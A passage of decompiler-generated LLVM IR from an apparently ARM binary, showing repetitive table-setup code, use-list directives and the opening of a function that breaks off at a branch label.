  store i32 %v2_867c, i32* %r3.global-to-local, align 4
  %v1_8684 = trunc i32 %v2_867c to i8
  %v2_8684 = load i32, i32* @r4, align 4
  %v3_8684 = inttoptr i32 %v2_8684 to i8*
  store i8 %v1_8684, i8* %v3_8684, align 1
  %v0_8688 = load i32, i32* %r2.global-to-local, align 4
  %v1_8688 = load i32, i32* @r6, align 4
  %v2_8688 = inttoptr i32 %v1_8688 to i32*
  store i32 %v0_8688, i32* %v2_8688, align 4
  %v2_868c = call i32 @function_12654(i32 %v1_867c, i32 8)
  %v2_8690 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8690 = zext i8 %v2_8690 to i32
  store i32 ptrtoint (i32* @global_var_a480.29 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_868c, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86a0 = load i32, i32* @r8, align 4
  %v2_86a0 = add i32 %v1_86a0, %v3_8690
  store i32 %v2_86a0, i32* %r1.global-to-local, align 4
  %v2_86a4 = load i32, i32* @global_var_1f250.19, align 4
  %v2_86a8 = inttoptr i32 %v2_868c to i32*
  store i32 ptrtoint (i32* @global_var_a480.29 to i32), i32* %v2_86a8, align 4
  %v3_86ac = load i32, i32* @r5, align 4
  %v4_86ac = add i32 %v3_86ac, 4
  %v5_86ac = inttoptr i32 %v4_86ac to i8*
  store i8 2, i8* %v5_86ac, align 1
  %v0_86b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86b0 = mul i32 %v0_86b0, 4
  store i32 %v3_86b0, i32* %r1.global-to-local, align 4
  %v5_86b4 = inttoptr i32 %v2_86a4 to i32*
  %v6_86b4 = call i32 @function_12788(i32* %v5_86b4, i32 %v3_86b0, i32 ptrtoint (i32* @global_var_a480.29 to i32), i32 2)
  %v2_86b8 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_86b8 = zext i8 %v2_86b8 to i32
  store i32 %v3_86b8, i32* %r3.global-to-local, align 4
  store i32 %v6_86b4, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r5, align 4
  %v5_86c0 = mul nuw nsw i32 %v3_86b8, 4
  %v6_86c0 = add i32 %v5_86c0, %v6_86b4
  %v7_86c0 = inttoptr i32 %v6_86c0 to i32*
  store i32 %v0_86c0, i32* %v7_86c0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r8, align 4
  %v2_86c8 = add i32 %v1_86c8, %v0_86c8
  store i32 %v2_86c8, i32* %r3.global-to-local, align 4
  %v1_86d0 = load i32, i32* @r6, align 4
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  store i32 %v6_86b4, i32* %v2_86d0, align 4
  %v0_86d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_86d4 = trunc i32 %v0_86d4 to i8
  %v2_86d4 = load i32, i32* @r4, align 4
  %v3_86d4 = inttoptr i32 %v2_86d4 to i8*
  store i8 %v1_86d4, i8* %v3_86d4, align 1
  %v2_86d8 = call i32 @function_12654(i32 %v1_86c8, i32 8)
  %v2_86dc = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_86dc = zext i8 %v2_86dc to i32
  store i32 ptrtoint (i32* @global_var_896c.31 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_86d8, i32* @r5, align 4
  %v1_86ec = load i32, i32* @r8, align 4
  %v2_86ec = add i32 %v1_86ec, %v3_86dc
  store i32 %v2_86ec, i32* %r1.global-to-local, align 4
  %v2_86f0 = load i32, i32* @global_var_1f250.19, align 4
  %v2_86f4 = inttoptr i32 %v2_86d8 to i32*
  store i32 ptrtoint (i32* @global_var_896c.31 to i32), i32* %v2_86f4, align 4
  %v0_86f8 = load i32, i32* @r7, align 4
  %v1_86f8 = trunc i32 %v0_86f8 to i8
  %v2_86f8 = load i32, i32* @r5, align 4
  %v3_86f8 = add i32 %v2_86f8, 4
  %v4_86f8 = inttoptr i32 %v3_86f8 to i8*
  store i8 %v1_86f8, i8* %v4_86f8, align 1
  %v0_86fc = load i32, i32* %r1.global-to-local, align 4
  %v3_86fc = mul i32 %v0_86fc, 4
  store i32 %v3_86fc, i32* %r1.global-to-local, align 4
  %v4_8700 = inttoptr i32 %v2_86f0 to i32*
  %v5_8700 = call i32 @function_12788(i32* %v4_8700, i32 %v3_86fc, i32 %v6_86b4, i32 ptrtoint (i32* @global_var_896c.31 to i32))
  %v2_8704 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8704 = zext i8 %v2_8704 to i32
  store i32 %v3_8704, i32* %r3.global-to-local, align 4
  store i32 %v5_8700, i32* %r2.global-to-local, align 4
  %v0_870c = load i32, i32* @r5, align 4
  %v5_870c = mul nuw nsw i32 %v3_8704, 4
  %v6_870c = add i32 %v5_870c, %v5_8700
  %v7_870c = inttoptr i32 %v6_870c to i32*
  store i32 %v0_870c, i32* %v7_870c, align 4
  %v0_8710 = load i32, i32* @r7, align 4
  store i32 %v0_8710, i32* %r1.global-to-local, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = load i32, i32* @r8, align 4
  %v2_8714 = add i32 %v1_8714, %v0_8714
  store i32 %v2_8714, i32* %r3.global-to-local, align 4
  %v1_871c = trunc i32 %v2_8714 to i8
  %v2_871c = load i32, i32* @r4, align 4
  %v3_871c = inttoptr i32 %v2_871c to i8*
  store i8 %v1_871c, i8* %v3_871c, align 1
  %v0_8720 = load i32, i32* %r2.global-to-local, align 4
  %v1_8720 = load i32, i32* @r6, align 4
  %v2_8720 = inttoptr i32 %v1_8720 to i32*
  store i32 %v0_8720, i32* %v2_8720, align 4
  %v2_8724 = call i32 @function_12654(i32 %v1_8714, i32 %v0_8710)
  %v2_8728 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8728 = zext i8 %v2_8728 to i32
  store i32 ptrtoint (i32* @global_var_c19c.33 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8724, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8738 = load i32, i32* @r8, align 4
  %v2_8738 = add i32 %v1_8738, %v3_8728
  store i32 %v2_8738, i32* %r1.global-to-local, align 4
  %v2_873c = load i32, i32* @global_var_1f250.19, align 4
  %v2_8740 = inttoptr i32 %v2_8724 to i32*
  store i32 ptrtoint (i32* @global_var_c19c.33 to i32), i32* %v2_8740, align 4
  %v3_8744 = load i32, i32* @r5, align 4
  %v4_8744 = add i32 %v3_8744, 4
  %v5_8744 = inttoptr i32 %v4_8744 to i8*
  store i8 3, i8* %v5_8744, align 1
  %v0_8748 = load i32, i32* %r1.global-to-local, align 4
  %v3_8748 = mul i32 %v0_8748, 4
  store i32 %v3_8748, i32* %r1.global-to-local, align 4
  %v5_874c = inttoptr i32 %v2_873c to i32*
  %v6_874c = call i32 @function_12788(i32* %v5_874c, i32 %v3_8748, i32 ptrtoint (i32* @global_var_c19c.33 to i32), i32 3)
  %v2_8750 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8750 = zext i8 %v2_8750 to i32
  store i32 %v3_8750, i32* %r3.global-to-local, align 4
  store i32 %v6_874c, i32* %r2.global-to-local, align 4
  %v0_8758 = load i32, i32* @r5, align 4
  %v5_8758 = mul nuw nsw i32 %v3_8750, 4
  %v6_8758 = add i32 %v5_8758, %v6_874c
  %v7_8758 = inttoptr i32 %v6_8758 to i32*
  store i32 %v0_8758, i32* %v7_8758, align 4
  %v0_875c = load i32, i32* @r7, align 4
  store i32 %v0_875c, i32* %r1.global-to-local, align 4
  %v0_8760 = load i32, i32* %r3.global-to-local, align 4
  %v1_8760 = load i32, i32* @r8, align 4
  %v2_8760 = add i32 %v1_8760, %v0_8760
  store i32 %v2_8760, i32* %r3.global-to-local, align 4
  %v1_8768 = trunc i32 %v2_8760 to i8
  %v2_8768 = load i32, i32* @r4, align 4
  %v3_8768 = inttoptr i32 %v2_8768 to i8*
  store i8 %v1_8768, i8* %v3_8768, align 1
  %v0_876c = load i32, i32* %r2.global-to-local, align 4
  %v1_876c = load i32, i32* @r6, align 4
  %v2_876c = inttoptr i32 %v1_876c to i32*
  store i32 %v0_876c, i32* %v2_876c, align 4
  %v2_8770 = call i32 @function_12654(i32 %v1_8760, i32 %v0_875c)
  %v2_8774 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8774 = zext i8 %v2_8774 to i32
  store i32 ptrtoint (i32* @global_var_baa4.35 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8770, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_8784 = load i32, i32* @r8, align 4
  %v2_8784 = add i32 %v1_8784, %v3_8774
  store i32 %v2_8784, i32* %r1.global-to-local, align 4
  %v2_8788 = load i32, i32* @global_var_1f250.19, align 4
  %v2_878c = inttoptr i32 %v2_8770 to i32*
  store i32 ptrtoint (i32* @global_var_baa4.35 to i32), i32* %v2_878c, align 4
  %v3_8790 = load i32, i32* @r5, align 4
  %v4_8790 = add i32 %v3_8790, 4
  %v5_8790 = inttoptr i32 %v4_8790 to i8*
  store i8 4, i8* %v5_8790, align 1
  %v0_8794 = load i32, i32* %r1.global-to-local, align 4
  %v3_8794 = mul i32 %v0_8794, 4
  store i32 %v3_8794, i32* %r1.global-to-local, align 4
  %v5_8798 = inttoptr i32 %v2_8788 to i32*
  %v6_8798 = call i32 @function_12788(i32* %v5_8798, i32 %v3_8794, i32 ptrtoint (i32* @global_var_baa4.35 to i32), i32 4)
  %v2_879c = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_879c = zext i8 %v2_879c to i32
  store i32 %v3_879c, i32* %r3.global-to-local, align 4
  store i32 %v6_8798, i32* %r2.global-to-local, align 4
  %v0_87a4 = load i32, i32* @r5, align 4
  %v5_87a4 = mul nuw nsw i32 %v3_879c, 4
  %v6_87a4 = add i32 %v5_87a4, %v6_8798
  %v7_87a4 = inttoptr i32 %v6_87a4 to i32*
  store i32 %v0_87a4, i32* %v7_87a4, align 4
  %v0_87a8 = load i32, i32* @r7, align 4
  store i32 %v0_87a8, i32* %r1.global-to-local, align 4
  %v0_87ac = load i32, i32* %r3.global-to-local, align 4
  %v1_87ac = load i32, i32* @r8, align 4
  %v2_87ac = add i32 %v1_87ac, %v0_87ac
  store i32 %v2_87ac, i32* %r3.global-to-local, align 4
  %v1_87b4 = trunc i32 %v2_87ac to i8
  %v2_87b4 = load i32, i32* @r4, align 4
  %v3_87b4 = inttoptr i32 %v2_87b4 to i8*
  store i8 %v1_87b4, i8* %v3_87b4, align 1
  %v0_87b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87b8 = load i32, i32* @r6, align 4
  %v2_87b8 = inttoptr i32 %v1_87b8 to i32*
  store i32 %v0_87b8, i32* %v2_87b8, align 4
  %v2_87bc = call i32 @function_12654(i32 %v1_87ac, i32 %v0_87a8)
  %v2_87c0 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_87c0 = zext i8 %v2_87c0 to i32
  store i32 ptrtoint (i32* @global_var_b2f0.37 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87bc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_87d0 = load i32, i32* @r8, align 4
  %v2_87d0 = add i32 %v1_87d0, %v3_87c0
  store i32 %v2_87d0, i32* %r1.global-to-local, align 4
  %v2_87d4 = load i32, i32* @global_var_1f250.19, align 4
  %v2_87d8 = inttoptr i32 %v2_87bc to i32*
  store i32 ptrtoint (i32* @global_var_b2f0.37 to i32), i32* %v2_87d8, align 4
  %v3_87dc = load i32, i32* @r5, align 4
  %v4_87dc = add i32 %v3_87dc, 4
  %v5_87dc = inttoptr i32 %v4_87dc to i8*
  store i8 5, i8* %v5_87dc, align 1
  %v0_87e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_87e0 = mul i32 %v0_87e0, 4
  store i32 %v3_87e0, i32* %r1.global-to-local, align 4
  %v5_87e4 = inttoptr i32 %v2_87d4 to i32*
  %v6_87e4 = call i32 @function_12788(i32* %v5_87e4, i32 %v3_87e0, i32 ptrtoint (i32* @global_var_b2f0.37 to i32), i32 5)
  %v2_87e8 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_87e8 = zext i8 %v2_87e8 to i32
  store i32 %v3_87e8, i32* %r3.global-to-local, align 4
  store i32 %v6_87e4, i32* %r2.global-to-local, align 4
  %v0_87f0 = load i32, i32* @r5, align 4
  %v5_87f0 = mul nuw nsw i32 %v3_87e8, 4
  %v6_87f0 = add i32 %v5_87f0, %v6_87e4
  %v7_87f0 = inttoptr i32 %v6_87f0 to i32*
  store i32 %v0_87f0, i32* %v7_87f0, align 4
  %v0_87f4 = load i32, i32* @r7, align 4
  store i32 %v0_87f4, i32* %r1.global-to-local, align 4
  %v0_87f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r8, align 4
  %v2_87f8 = add i32 %v1_87f8, %v0_87f8
  store i32 %v2_87f8, i32* %r3.global-to-local, align 4
  %v1_8800 = trunc i32 %v2_87f8 to i8
  %v2_8800 = load i32, i32* @r4, align 4
  %v3_8800 = inttoptr i32 %v2_8800 to i8*
  store i8 %v1_8800, i8* %v3_8800, align 1
  %v0_8804 = load i32, i32* %r2.global-to-local, align 4
  %v1_8804 = load i32, i32* @r6, align 4
  %v2_8804 = inttoptr i32 %v1_8804 to i32*
  store i32 %v0_8804, i32* %v2_8804, align 4
  %v2_8808 = call i32 @function_12654(i32 %v1_87f8, i32 %v0_87f4)
  %v2_880c = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_880c = zext i8 %v2_880c to i32
  store i32 43836, i32* %r2.global-to-local, align 4
  store i32 %v2_8808, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_881c = load i32, i32* @r8, align 4
  %v2_881c = add i32 %v1_881c, %v3_880c
  store i32 %v2_881c, i32* %r1.global-to-local, align 4
  %v2_8820 = load i32, i32* @global_var_1f250.19, align 4
  %v2_8824 = inttoptr i32 %v2_8808 to i32*
  store i32 43836, i32* %v2_8824, align 4
  %v3_8828 = load i32, i32* @r5, align 4
  %v4_8828 = add i32 %v3_8828, 4
  %v5_8828 = inttoptr i32 %v4_8828 to i8*
  store i8 10, i8* %v5_8828, align 1
  %v0_882c = load i32, i32* %r1.global-to-local, align 4
  %v3_882c = mul i32 %v0_882c, 4
  store i32 %v3_882c, i32* %r1.global-to-local, align 4
  %v5_8830 = inttoptr i32 %v2_8820 to i32*
  %v6_8830 = call i32 @function_12788(i32* %v5_8830, i32 %v3_882c, i32 43836, i32 10)
  %v2_8834 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8834 = zext i8 %v2_8834 to i32
  store i32 %v3_8834, i32* %r3.global-to-local, align 4
  store i32 %v6_8830, i32* %r2.global-to-local, align 4
  %v0_883c = load i32, i32* @r5, align 4
  %v5_883c = mul nuw nsw i32 %v3_8834, 4
  %v6_883c = add i32 %v5_883c, %v6_8830
  %v7_883c = inttoptr i32 %v6_883c to i32*
  store i32 %v0_883c, i32* %v7_883c, align 4
  %v0_8840 = load i32, i32* @r7, align 4
  store i32 %v0_8840, i32* %r1.global-to-local, align 4
  %v0_8844 = load i32, i32* %r3.global-to-local, align 4
  %v1_8844 = load i32, i32* @r8, align 4
  %v2_8844 = add i32 %v1_8844, %v0_8844
  store i32 %v2_8844, i32* %r3.global-to-local, align 4
  %v1_884c = trunc i32 %v2_8844 to i8
  %v2_884c = load i32, i32* @r4, align 4
  %v3_884c = inttoptr i32 %v2_884c to i8*
  store i8 %v1_884c, i8* %v3_884c, align 1
  %v0_8850 = load i32, i32* %r2.global-to-local, align 4
  %v1_8850 = load i32, i32* @r6, align 4
  %v2_8850 = inttoptr i32 %v1_8850 to i32*
  store i32 %v0_8850, i32* %v2_8850, align 4
  %v2_8854 = call i32 @function_12654(i32 %v1_8844, i32 %v0_8840)
  %v2_8858 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8858 = zext i8 %v2_8858 to i32
  store i32 ptrtoint (i32* @global_var_9a2c.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8854, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_8868 = load i32, i32* @r8, align 4
  %v2_8868 = add i32 %v1_8868, %v3_8858
  store i32 %v2_8868, i32* %r1.global-to-local, align 4
  %v2_886c = load i32, i32* @global_var_1f250.19, align 4
  %v2_8870 = inttoptr i32 %v2_8854 to i32*
  store i32 ptrtoint (i32* @global_var_9a2c.40 to i32), i32* %v2_8870, align 4
  %v3_8874 = load i32, i32* @r5, align 4
  %v4_8874 = add i32 %v3_8874, 4
  %v5_8874 = inttoptr i32 %v4_8874 to i8*
  store i8 6, i8* %v5_8874, align 1
  %v0_8878 = load i32, i32* %r1.global-to-local, align 4
  %v3_8878 = mul i32 %v0_8878, 4
  store i32 %v3_8878, i32* %r1.global-to-local, align 4
  %v5_887c = inttoptr i32 %v2_886c to i32*
  %v6_887c = call i32 @function_12788(i32* %v5_887c, i32 %v3_8878, i32 ptrtoint (i32* @global_var_9a2c.40 to i32), i32 6)
  %v2_8880 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8880 = zext i8 %v2_8880 to i32
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  store i32 %v6_887c, i32* %r2.global-to-local, align 4
  %v0_8888 = load i32, i32* @r5, align 4
  %v5_8888 = mul nuw nsw i32 %v3_8880, 4
  %v6_8888 = add i32 %v5_8888, %v6_887c
  %v7_8888 = inttoptr i32 %v6_8888 to i32*
  store i32 %v0_8888, i32* %v7_8888, align 4
  %v0_888c = load i32, i32* @r7, align 4
  store i32 %v0_888c, i32* %r1.global-to-local, align 4
  %v0_8890 = load i32, i32* %r3.global-to-local, align 4
  %v1_8890 = load i32, i32* @r8, align 4
  %v2_8890 = add i32 %v1_8890, %v0_8890
  store i32 %v2_8890, i32* %r3.global-to-local, align 4
  %v1_8898 = trunc i32 %v2_8890 to i8
  %v2_8898 = load i32, i32* @r4, align 4
  %v3_8898 = inttoptr i32 %v2_8898 to i8*
  store i8 %v1_8898, i8* %v3_8898, align 1
  %v0_889c = load i32, i32* %r2.global-to-local, align 4
  %v1_889c = load i32, i32* @r6, align 4
  %v2_889c = inttoptr i32 %v1_889c to i32*
  store i32 %v0_889c, i32* %v2_889c, align 4
  %v2_88a0 = call i32 @function_12654(i32 %v1_8890, i32 %v0_888c)
  %v2_88a4 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_88a4 = zext i8 %v2_88a4 to i32
  store i32 ptrtoint (i32* @global_var_9398.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88a0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88b4 = load i32, i32* @r8, align 4
  %v2_88b4 = add i32 %v1_88b4, %v3_88a4
  store i32 %v2_88b4, i32* %r1.global-to-local, align 4
  %v2_88b8 = load i32, i32* @global_var_1f250.19, align 4
  %v2_88bc = inttoptr i32 %v2_88a0 to i32*
  store i32 ptrtoint (i32* @global_var_9398.42 to i32), i32* %v2_88bc, align 4
  %v3_88c0 = load i32, i32* @r5, align 4
  %v4_88c0 = add i32 %v3_88c0, 4
  %v5_88c0 = inttoptr i32 %v4_88c0 to i8*
  store i8 7, i8* %v5_88c0, align 1
  %v0_88c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_88c4 = mul i32 %v0_88c4, 4
  store i32 %v3_88c4, i32* %r1.global-to-local, align 4
  %v5_88c8 = inttoptr i32 %v2_88b8 to i32*
  %v6_88c8 = call i32 @function_12788(i32* %v5_88c8, i32 %v3_88c4, i32 ptrtoint (i32* @global_var_9398.42 to i32), i32 7)
  %v2_88cc = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_88cc = zext i8 %v2_88cc to i32
  store i32 %v3_88cc, i32* %r3.global-to-local, align 4
  store i32 %v6_88c8, i32* %r2.global-to-local, align 4
  %v0_88d4 = load i32, i32* @r5, align 4
  %v5_88d4 = mul nuw nsw i32 %v3_88cc, 4
  %v6_88d4 = add i32 %v5_88d4, %v6_88c8
  %v7_88d4 = inttoptr i32 %v6_88d4 to i32*
  store i32 %v0_88d4, i32* %v7_88d4, align 4
  %v0_88d8 = load i32, i32* @r7, align 4
  store i32 %v0_88d8, i32* %r1.global-to-local, align 4
  %v0_88dc = load i32, i32* %r3.global-to-local, align 4
  %v1_88dc = load i32, i32* @r8, align 4
  %v2_88dc = add i32 %v1_88dc, %v0_88dc
  store i32 %v2_88dc, i32* %r3.global-to-local, align 4
  %v1_88e4 = trunc i32 %v2_88dc to i8
  %v2_88e4 = load i32, i32* @r4, align 4
  %v3_88e4 = inttoptr i32 %v2_88e4 to i8*
  store i8 %v1_88e4, i8* %v3_88e4, align 1
  %v0_88e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_88e8 = load i32, i32* @r6, align 4
  %v2_88e8 = inttoptr i32 %v1_88e8 to i32*
  store i32 %v0_88e8, i32* %v2_88e8, align 4
  %v2_88ec = call i32 @function_12654(i32 %v1_88dc, i32 %v0_88d8)
  %v2_88f0 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_88f0 = zext i8 %v2_88f0 to i32
  store i32 35852, i32* %r2.global-to-local, align 4
  store i32 %v2_88ec, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8900 = load i32, i32* @r8, align 4
  %v2_8900 = add i32 %v1_8900, %v3_88f0
  store i32 %v2_8900, i32* %r1.global-to-local, align 4
  %v2_8904 = load i32, i32* @global_var_1f250.19, align 4
  %v2_8908 = inttoptr i32 %v2_88ec to i32*
  store i32 35852, i32* %v2_8908, align 4
  %v3_890c = load i32, i32* @r5, align 4
  %v4_890c = add i32 %v3_890c, 4
  %v5_890c = inttoptr i32 %v4_890c to i8*
  store i8 9, i8* %v5_890c, align 1
  %v0_8910 = load i32, i32* %r1.global-to-local, align 4
  %v3_8910 = mul i32 %v0_8910, 4
  store i32 %v3_8910, i32* %r1.global-to-local, align 4
  %v5_8914 = inttoptr i32 %v2_8904 to i32*
  %v6_8914 = call i32 @function_12788(i32* %v5_8914, i32 %v3_8910, i32 35852, i32 9)
  %v2_8918 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8918 = zext i8 %v2_8918 to i32
  store i32 %v3_8918, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r6, align 4
  %v2_891c = inttoptr i32 %v1_891c to i32*
  store i32 %v6_8914, i32* %v2_891c, align 4
  %v0_8920 = load i32, i32* @r5, align 4
  %v2_8920 = load i32, i32* %r3.global-to-local, align 4
  %v5_8920 = mul i32 %v2_8920, 4
  %v6_8920 = add i32 %v5_8920, %v6_8914
  %v7_8920 = inttoptr i32 %v6_8920 to i32*
  store i32 %v0_8920, i32* %v7_8920, align 4
  %v0_8924 = load i32, i32* %r3.global-to-local, align 4
  %v1_8924 = load i32, i32* @r8, align 4
  %v2_8924 = add i32 %v1_8924, %v0_8924
  store i32 %v2_8924, i32* %r2.global-to-local, align 4
  %v1_892c = trunc i32 %v2_8924 to i8
  %v2_892c = load i32, i32* @r4, align 4
  %v3_892c = inttoptr i32 %v2_892c to i8*
  store i8 %v1_892c, i8* %v3_892c, align 1
  %v2_8930 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8930, i32* @r4, align 4
  store i32 %v6_85e0, i32* @r5, align 4
  store i32 %v9_85e0, i32* @r6, align 4
  store i32 %v12_85e0, i32* @r7, align 4
  store i32 %v15_85e0, i32* @r8, align 4
  ret i32 %v1_8924

; uselistorder directives
  uselistorder i32 %v1_8924, { 1, 0 }
  uselistorder i32 %v3_8910, { 1, 0 }
  uselistorder i32 %v1_88dc, { 1, 0 }
  uselistorder i32 %v3_88c4, { 1, 0 }
  uselistorder i32 %v1_8890, { 1, 0 }
  uselistorder i32 %v3_8878, { 1, 0 }
  uselistorder i32 %v1_8844, { 1, 0 }
  uselistorder i32 %v3_882c, { 1, 0 }
  uselistorder i32 %v1_87f8, { 1, 0 }
  uselistorder i32 %v3_87e0, { 1, 0 }
  uselistorder i32 %v1_87ac, { 1, 0 }
  uselistorder i32 %v3_8794, { 1, 0 }
  uselistorder i32 %v1_8760, { 1, 0 }
  uselistorder i32 %v3_8748, { 1, 0 }
  uselistorder i32 %v1_8714, { 1, 0 }
  uselistorder i32 %v3_86fc, { 1, 0 }
  uselistorder i32 %v1_86c8, { 1, 0 }
  uselistorder i32 %v6_86b4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86b0, { 1, 0 }
  uselistorder i32 %v1_867c, { 1, 0 }
  uselistorder i32 %v3_8664, { 1, 0 }
  uselistorder i32 %v2_8640, { 1, 0 }
  uselistorder i32 %v6_861c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8618, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 39, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43 }
  uselistorder i8* bitcast (i8** @global_var_1f24c.17 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_1f24d.25 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1f250.19, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
}

define i32 @function_896c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_896c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_896c = load i32, i32* @r4, align 4
  %v18_896c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8988 = call i32 @function_12654(i32 %arg1, i32 4)
  store i32 %v2_8988, i32* @sl, align 4
  %v0_8994 = load i32, i32* @r7, align 4
  %v2_8998 = call i32 @function_12654(i32 %v0_8994, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89a4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8998, i32* @r8, align 4
  %v0_89b4 = load i32, i32* @r5, align 4
  %v4_89b8 = inttoptr i32 %v0_89a4 to i32*
  %v5_89b8 = call i32 @function_8570(i32 %v0_89b4, i32* %v4_89b8, i32 7, i32 65535)
  %v3_89c0 = urem i32 %v5_89b8, 65536
  %v0_89c4 = load i32, i32* @r6, align 4
  %v0_89cc = load i32, i32* @r4, align 4
  store i32 %v0_89cc, i32* %r3.global-to-local, align 4
  %v0_89d0 = load i32, i32* @r5, align 4
  %v5_89d8 = inttoptr i32 %v0_89c4 to i32*
  %v6_89d8 = call i32 @function_8570(i32 %v0_89d0, i32* %v5_89d8, i32 6, i32 %v0_89cc)
  %v0_89dc = load i32, i32* @r6, align 4
  %v3_89e0 = mul i32 %v6_89d8, 65536
  store i32 %v3_89e0, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_89ec = load i32, i32* @r5, align 4
  %v4_89f0 = inttoptr i32 %v0_89dc to i32*
  %v5_89f0 = call i32 @function_8570(i32 %v0_89ec, i32* %v4_89f0, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a00 = load i32, i32* @r6, align 4
  %v0_8a04 = load i32, i32* @r5, align 4
  %v3_8a08 = urem i32 %v5_89f0, 65536
  store i32 %v3_8a08, i32* @r5, align 4
  %v4_8a0c = inttoptr i32 %v0_8a00 to i32*
  %v5_8a0c = call i32 @function_8570(i32 %v0_8a04, i32* %v4_8a0c, i32 1, i32 1)
  %v0_8a10 = load i32, i32* %sb.global-to-local, align 4
  %v3_8a10 = udiv i32 %v0_8a10, 65536
  store i32 %v3_8a10, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a18 = load i32, i32* @r4, align 4
  %v9_8a18 = icmp eq i32 %v3_8a10, %v1_8a18
  br i1 %v9_8a18, label %dec_label_pc_8a48, label %bb

bb:                                               ; preds = %dec_label_pc_896c
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8a30 = udiv i32 %v0_8a10, 16777216
  store i32 %v4_8a30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8a58

dec_label_pc_8a48:                                ; preds = %dec_label_pc_896c
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8a48 = call i32 @function_e0d0()
  br label %dec_label_pc_8a58

dec_label_pc_8a58:                                ; preds = %bb, %dec_label_pc_8a48
  %v0_8a3c10 = urem i32 %v5_8a0c, 256
  %v0_8a58 = load i32, i32* @r7, align 4
  %v2_8a58 = icmp eq i32 %v0_8a58, 0
  br i1 %v2_8a58, label %dec_label_pc_8b98, label %dec_label_pc_8a60

dec_label_pc_8a60:                                ; preds = %dec_label_pc_8a58
